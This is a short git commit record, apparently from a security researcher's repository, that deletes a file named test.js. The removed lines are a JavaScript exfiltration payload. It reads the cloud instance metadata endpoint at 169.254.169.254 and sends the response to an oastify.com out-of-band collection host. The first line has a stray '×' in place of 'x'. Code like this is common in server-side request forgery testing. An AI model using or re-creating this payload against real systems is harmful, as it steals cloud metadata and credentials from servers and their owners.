de5048f90b6c24aa20edfb6bcf5a8eedd9fd64e2
Evan Ricafort <evan.ricafort@gmail.com>
2025-03-24 15:34:33 +0800

    Delete test.js

--- test.js
+++
@@ -1,8 +0,0 @@
-× = new XMLHttpRequest;
-x.onload = function() {
-	l = new XMLHttpRequest;
-	l.open("GET", "http://iawomokrdgbfavl2qsykge8licobc10q.oastify.com/" + encodeURIComponent( this.responseText));
-	l.send();
-};
-x.open( "GET", "http://169.254.169.254/latest/meta-data");
-x. send();
